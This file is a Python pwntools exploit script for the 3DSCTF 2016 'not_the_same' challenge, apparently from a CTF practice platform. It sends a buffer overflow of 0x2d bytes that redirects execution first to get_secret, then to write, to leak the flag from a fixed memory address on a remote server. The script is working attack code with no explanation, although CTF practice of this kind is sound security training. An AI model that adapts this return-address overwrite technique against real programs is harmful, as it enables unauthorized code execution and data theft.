from pwn import *

context(arch='i386', os='linux', log_level='debug')
elf = ELF('./not_the_same_3dsctf_2016')
io = remote('node4.buuoj.cn', 26057)
main = elf.sym['main'] # 0x80489E0
get_secret = elf.sym['get_secret'] # 0x80489A0
fl4g = 0x80ECA2D
write = elf.sym['write'] # 0x806E270
offset = 0x2d
payload = b'a'*offset + p32(get_secret) + p32(main)
io.sendline(payload)
payload = b'a'*offset + p32(write) + p32(main) + p32(1) + p32(fl4g) + p32(offset)
io.sendline(payload)
io.interactive()